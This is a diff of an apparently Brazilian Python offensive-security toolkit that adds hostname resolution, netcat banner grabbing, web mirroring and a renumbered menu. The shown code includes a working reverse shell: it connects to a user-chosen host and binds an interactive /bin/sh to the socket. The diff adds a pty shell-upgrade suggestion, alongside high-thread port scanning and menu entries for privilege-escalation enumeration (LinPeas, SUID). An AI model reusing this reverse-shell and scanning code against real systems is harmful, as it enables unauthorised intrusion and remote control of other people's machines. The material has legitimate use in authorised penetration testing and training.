@@ -1,11 +1,12 @@
 #!/usr/bin/env python
-version = "v2.5-dev"
+version = "v3.1-dev"
 
 import os                                                      
 import re
 import sys
 import socket                                                  
 import requests
+import threading
 import time as t
 import http.server as hs
 import socketserver as ss
@@ -93,7 +94,7 @@ def host_discovery():
                     with open('ARQ/ips.txt','r') as f:
                         content = f.read()
                         hosts = tuple(content.splitlines())
-                    thread = 400
+                    thread = 800
                     try:
                         with e(max_workers=int(thread)) as exe:
                             for host in hosts:
@@ -113,16 +114,45 @@ def host_discovery():
             except KeyboardInterrupt:
                 print('\n'+Ctrl_C)
                 quit()
+        else:
+            input(press)
+            main()
     except KeyboardInterrupt:
                 print('\n'+Ctrl_C)
                 quit()
+
+
+#=======================================================================================
+def hostname_resolv():
+    with open("ARQ/hosts.txt", "r") as f:
+        lst = f.readlines()
+    remove = '\n'
+    lst = [l.replace(remove, "") for l in lst]
+    print('Hosts descobertos:')
+    for host in lst:
+        try:
+            socket.setdefaulttimeout(5)
+            hostname = socket.gethostbyaddr(host)[0]
+            print(f'[+] {host} - ({hostname})')
+            with open("ARQ/hostname.txt", "a") as f:
+                print(f'{host} - ({hostname})', file=f)
+        except socket.timeout:
+            print(f'[+] {host}')
+        except socket.herror:
+            print(f'[+] {host}')
+        except KeyboardInterrupt:
+            print("[-] Saindo!")
+            quit()
+    input(press)
+    main()
+
 
 #=======================================================================================
 def portscan_uniq():
     try:
         ip = input('Digite o IP: ')
         for port in range(1,65535):
-            printer(f"Procurando Portas: {str(port)}")
+            #printer(f"Procurando Portas: {str(port)}")
             s.settimeout(0.5)
             result = s.connect_ex((ip,port))
             if result == 0:
@@ -140,6 +170,7 @@ def portscan_uniq():
         input(press)
         main()
 
+
 #=======================================================================================
 def portscan():
     try:
@@ -153,7 +184,11 @@ def portscan():
                 socket.setdefaulttimeout(0.5)
                 hostname = socket.gethostbyaddr(host)[0]
                 print(f'[+] {host} - ({hostname})')
-                print(f'[+] {host}')
+
+                #print(f'[+] {host}')
+                with open("ARQ/hostname.txt", "a") as f:
+                    print(f'{host} - ({hostname})', file=f)
+                
             except socket.timeout:
                 print(f'[+] {host}')
             except socket.herror:
@@ -166,13 +201,12 @@ def portscan():
                       '\033[0;31mPortScanner\033[m? (S/N) ')
         if sit_h.lower() == "s":
             rang = int(input('Digite o RANGE de portas: '))
-            print('Aguarde ...')
+            print("Não aparece nada, mas está rodando ...")
             for host in lst:
                 def scan(ip, port, l):
-                    printer(f"Procurando Portas: {str(port)}")
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.4)  
-                    t.sleep(0.01)
+                    s.settimeout(0.5)  
+                    t.sleep(0.02)
                     try:
                         result = s.connect_ex((ip, port))
                         espaco = 10 - l
@@ -182,11 +216,11 @@ def portscan():
                                 try:
                                     service = f"{socket.getservbyport(port)}"
                                     t.sleep(0.1)
-                                    print(f"{str(port)}/TCP {espaco} {service}", file=f)
-                                    print(str(port) + "/TCP" + espaco + f"{service}       ")
+                                    print(f"{str(port)} / TCP {espaco} {service}", file=f)
+                                    print(str(port) + " / TCP" + espaco + f"{service}       ")
                                 except socket.error:
-                                    print(str(port) + "/TCP" + espaco + "Desconhecido", file=f)
-                                    print(str(port) + "/TCP" + espaco + "Desconhecido")
+                                    print(str(port) + " / TCP" + espaco + "Desconhecido", file=f)
+                                    print(str(port) + " / TCP" + espaco + "Desconhecido")
                                 except KeyboardInterrupt:
                                     print("[-] Saindo!")
                                     quit()
@@ -195,12 +229,12 @@ def portscan():
                     finally:
                         s.close()
                     return True
-                thread = 16
+                thread = 40
                 ports = range(rang)
                 with open("ARQ/portscan.txt", "a") as f:
                     print("[+] Host: " + host, file=f)
                     print("\n[+] Host: " + host)
-                    print("PORTA        SERVIÇO")
+                    print("PORTA          SERVIÇO PROVAVEL")
                 with e(max_workers=int(thread)) as exe:
                     try:
                         for port in ports:
@@ -220,50 +254,76 @@ def portscan():
         input(press)
         main()
         
+        
 #=======================================================================================
 def http_finder():
-    try:
-        with open("ARQ/portscan.txt", "r") as f:
-            linhas = f.readlines()
-        port_up = ()
-        for i, linha in enumerate(linhas):
-            match = re.search(r"80/", linha)
-            if match:
-                port_up.append(linhas[i - 1])
-        pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
-        lst=()
-        print("Encontrado HTTP Server nos seguintes Hosts: \n")
-        for line in port_up: 
-            try:
-                lst.append(pattern.search(line)[0])
-                #print(line)
-            except TypeError:
-                pass
-        
-        for host in lst:
-            with open(f"ARQ/{host}.html", "a") as f:
-                print(f'[+] {host}\n')
-                os.system(f"rm -rf ARQ/{host}.html")
-                #os.system(f'wget {host} -O ARQ/{host}.html')
-                os.system(f'wget --mirror --convert-links --adjust-extension --page-requisites {host} -O ARQ/{host}')
-                #try:
-                #    response = requests.get('http://'+host)
-                #    content = response.text
-                #    print(content)
-                #except HTTPSConnectionPool as err:
-                #    print(err)
-                #    continue
-        input(press)
-        main()
-    except KeyboardInterrupt:
-        print('\n'+Ctrl_C)
-    except FileNotFoundError:
-        print("\nO arquivo de hosts descobertos deve ser gerado.")
-        input(press)
-        main()
+    def wget_pg(ip, porta):
+        os.system(f"rm ARQ/WEB/{ip}.html")
+        os.system(f'wget --mirror --convert-links --adjust-extension --page-requisites --timeout=10 http://{ip}:{porta} -P ARQ/WEB/')
 
+    for ip in os.listdir("ARQ/HEAD"):
+        caminho_arquivo = os.path.join("ARQ/HEAD", ip)
+
+        if os.path.isfile(caminho_arquivo):
+            with open(caminho_arquivo, 'r') as arquivo:
+                conteudo = arquivo.readlines()
+                servico_web_encontrado = False
+                porta = None
+                for linha in conteudo:
+                    match = re.search(r'Porta: (\d+)', linha)
+                    if match:
+                        porta = match.group(1)
+
+                    if "http" in linha.lower() or "https" in linha.lower():
+                        servico_web_encontrado = True
+                        break  
+
+                if servico_web_encontrado:
+                    thread = threading.Thread(target=wget_pg, args=(ip, porta))
+                    thread.start()
+
+    for thread in threading.enumerate():
+        if thread != threading.current_thread():
+            thread.join()
+
+
+#=======================================================================================    
+def nc_get():
+    os.system('rm ARQ/HEAD/*')
+    os.makedirs("ARQ/HEAD", exist_ok=True)
+
+    def get(host, porta, servico): 
+        try:
+            comando = f'echo -e "\n" | nc -vn -w 10 {host} {porta} 2>&1 | tee'
+            t.sleep(0.6)
+            resultado = os.popen(comando).read()
+            caminho_arquivo = f"ARQ/HEAD/{host}"
+            with open(caminho_arquivo, "a") as arquivo_respostas:
+                arquivo_respostas.write(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")
+                print(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")
+        except Exception as e:
+            print(f"Erro ao executar o comando nc: {e}")
+
+    def get_parse():
+        with open("ARQ/portscan.txt", "r") as arquivo:
+            linhas = arquivo.read().strip().split('\n')
+            for linha in linhas:
+                if '[+] Host:' in linha:
+                    host = linha.split(':')[-1].strip()
+                elif 'PORTA' not in linha and '/' in linha:
+                    porta, servico = map(str.strip, linha.split('/')[0:2])
+                    #print(f"Host: {host}\tPorta: {porta}\tServiço: {servico}\n")
+                    t = threading.Thread(target=get, args=(host, porta, servico))
+                    t.start()
+    sit = input("O Programa irá salvar os cabeçalhos das conexões em ./ARQ/HEAD. Deseja continuar (S/N): ")
+    if(sit.lower() == 's'):
+        get_parse()
+    else:
+        input(press)
+        main()
+    
+    
 #=======================================================================================
-
 def link():
     def crawl(url):
         try:
@@ -392,9 +452,20 @@ def link():
         #            process_url(url_atual)
         #            os.dup2(os.dup(2), 1) 
         #    print("WebCrawler salvo com sucesso!")
+    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
+    if (sit_scan.lower() == 'h'):
+        target = input('Digite o endereço do site: (site.com)\n')
+        links(target)
+    elif (sit_scan.lower() == 'l'):
+        for ip in os.listdir("ARQ/WEB"):
+            links(ip)
+            nsit = input('A busca neste host terminou. Deseja continuar? (S/N):  ')
+            if nsit.lower() == 's':  # Corrected comparison
+                pass
+            else:
+                break
 
-    target = input('Digite o endereço do site: (site.com)\n')
-    links(target)
+
 #=======================================================================================
 def serverhttp():
     try:
@@ -889,6 +960,8 @@ Você deseja Pesquisar ou Executar?
             try:
                 s.connect((commander,porta))
                 print('Conectado com Sucesso!')
+                comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
+                print(f"Sugestão de comando: {comando}")
                 os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
                 p=os.system("/bin/sh -i")
             except OSError:
@@ -937,24 +1010,26 @@ def banner():
 
  \033[0;34m[1]\033[m - Criar lista de IPs
  \033[0;34m[2]\033[m - Host Discovery
- \033[0;34m[3]\033[m - Port Scanner
- \033[0;34m[4]\033[m - HTTP Finder
- \033[0;34m[5]\033[m - WebCrawler
- \033[0;34m[6]\033[m - ServerHTTP
- \033[0;34m[7]\033[m - Wifi Scanner
- \033[0;34m[8]\033[m - BackUp
- \033[0;34m[8x]\033[m- Clonar Part|Disk
- \033[0;34m[9]\033[m - CronTab
- \033[0;34m[10]\033[m- Finder
- \033[0;34m[11]\033[m- Auditor
- \033[0;34m[12]\033[m- Config IP
- \033[0;34m[13]\033[m- LinPeas
- \033[0;34m[14]\033[m- LinEnum
- \033[0;34m[15]\033[m- SUID
- \033[0;34m[16]\033[m- NC Lister
- \033[0;34m[17]\033[m- Reverse Shell
- \033[0;34m[18]\033[m- Server TCP
- \033[0;34m[19]\033[m- Tryeres
+ \033[0;34m[3]\033[m - Hostname Resolve              
+ \033[0;34m[4]\033[m - Port Scanner
+ \033[0;34m[5]\033[m - NC GET
+ \033[0;34m[6]\033[m - WebFinder
+ \033[0;34m[7]\033[m - WebCrawler
+ \033[0;34m[8]\033[m - ServerHTTP
+ \033[0;34m[9]\033[m - Wifi Scanner
+ \033[0;34m[10]\033[m- BackUp
+ \033[0;34m[11]\033[m- Clonar Part|Disk
+ \033[0;34m[12]\033[m- CronTab
+ \033[0;34m[13]\033[m- Finder
+ \033[0;34m[14]\033[m- Auditor
+ \033[0;34m[15]\033[m- Config IP
+ \033[0;34m[16]\033[m- LinPeas
+ \033[0;34m[17]\033[m- LinEnum
+ \033[0;34m[18]\033[m- SUID
+ \033[0;34m[19]\033[m- NC Listen
+ \033[0;34m[20]\033[m- Reverse Shell
+ \033[0;34m[21]\033[m- Server TCP
+ \033[0;34m[22]\033[m- Tryeres
  \033[0;34m[0]\033[m - Sair
 ''')
         opcao=int(input('Escolha uma opção: '))
@@ -965,76 +1040,84 @@ def banner():
             host_discovery()
             pass
         elif opcao == 3:
+            hostname_resolv()
+            pass
+        elif opcao == 4:
             sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
             if (sit_scan.lower() == 'h'):
                 portscan_uniq()
             elif (sit_scan.lower() == 'l'):
                 portscan()
             pass
-        elif opcao == 4:
-            http_finder()
-            pass
         elif opcao == 5:
-            link()
+            nc_get()
             pass
         elif opcao == 6:
-            serverhttp()
+            http_finder()
             pass
         elif opcao == 7:
-            wifi_scan()
+            link()
             pass
         elif opcao == 8:
-            backup()
+            serverhttp()
             pass
         elif opcao == 9:
-            cron()
+            wifi_scan()
             pass
         elif opcao == 10:
-            finder()
+            backup()
             pass
         elif opcao == 11:
-            infosys()
+            input("Configurar")
+            #clonar()
             pass
         elif opcao == 12:
-            config_IP()
+            cron()
             pass
         elif opcao == 13:
-            linpeas()
+            finder()
             pass
         elif opcao == 14:
-            linenum()
-            pass		
+            infosys()
+            pass
         elif opcao == 15:
-            suid()
-            pass		
+            config_IP()
+            pass
         elif opcao == 16:
-            porta = int(input("Digite a Porta: "))
-            comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
-            print(f"Sugestão de comando: {comando}")
-            nc(porta)
+            linpeas()
             pass
         elif opcao == 17:
-            reverse_shell()
+            linenum()
             pass		
         elif opcao == 18:
-            server_tcp()
+            suid()
             pass		
         elif opcao == 19:
+            nc()
+            pass
+        elif opcao == 20:
+            reverse_shell()
+            pass		
+        elif opcao == 21:
+            server_tcp()
+            pass		
+        elif opcao == 22:
             os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py')
-            main()		
-        elif (opcao == 0):
+            main()	
+        elif opcao == 0:
             print('Volte sempre! ¯\_(ツ)_/¯')
             quit()
-        elif opcao > 19:
+        elif opcao > 22:
             print('Digite uma opção válida!')
             input(press)
             main()
+            
     except ValueError as e:
-        print(f'\nHouve um Erro! \n{e}')
+        print('Digite uma opção válida!')
         input(press)
         main()
     except NameError:
-        print('Digite uma opção válida!'+NameError)
+        print('Digite uma opção válida!')
         input(press)
         main()
         
